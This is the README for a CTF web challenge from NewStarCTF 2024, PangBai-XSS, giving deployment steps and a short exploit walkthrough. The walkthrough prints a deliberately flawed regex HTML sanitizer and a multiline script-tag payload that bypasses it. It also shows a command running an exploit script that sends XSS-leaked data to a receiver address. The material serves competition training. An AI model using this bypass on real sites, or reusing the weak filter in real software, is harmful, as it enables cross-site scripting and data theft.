# PangBai-XSS

This is the challenge for NewStarCTF 2024 in the category of Web, Week 5.

This challenge is a simple XSS challenge.

The function `safe_html` in [src/page.ts](src/page.ts) is provided to participants.

## Deployment

> [!NOTE]
> If the development is at ichunqiu platform, please modify [docker-compose.yml](docker-compose.yml) to change `Dockerfile` into `Dockerfile.icq` and the environment variable `FLAG` to `ICQ_FLAG`.

Docker is provided. You can run the following command to start the environment quickly:

```bash
docker compose build # Build the image
docker compose up -d # Start the container
```

For manual installation, you can follow the steps below.

Install the dependencies:

```bash
pnpm install
```

Build the frontend:

```bash
pnpm build
```

Start the server:

```bash
pnpm start
```

> [!NOTE]
> The default runtime is not [Node.js](https://nodejs.org/) but [bun.sh](https://bun.sh). Just replace `start` scripts in [package.json](package.json) to meet your preference.

## Exploit

Analyze the `safe_html` function in [src/page.ts](src/page.ts).

```typescript
function safe_html(str: string) {
    return str
        .replace(/<.*>/igm, '')
        .replace(/<\.*>/igm, '')
        .replace(/<.*>.*<\/.*>/igm, '')
}
```

It's easy to bypass the filter, because the `m` flag disables matching the newline character, it matches multiline splitly.

```html
<script
>alert(1)</script
>
```

The exploit script is provided on [exploit/exp.ts](exploit/exp.ts). Please run it with bun.

```bash
bun exp.py '172.18.0.2:8000' -r '192.168.16.10:5555' -p '5555'
# `-r` means the address which receive the XSS leaked data
# `-p` means the port of the address on local machine
# Note that the exploit script has to be run on the receiver machine.
```

For more details, please use `--help` to get more information about this exploit script.

## License

Copyright (c) Cnily03. All rights reserved.

Licensed under the [MIT](LICENSE) License.
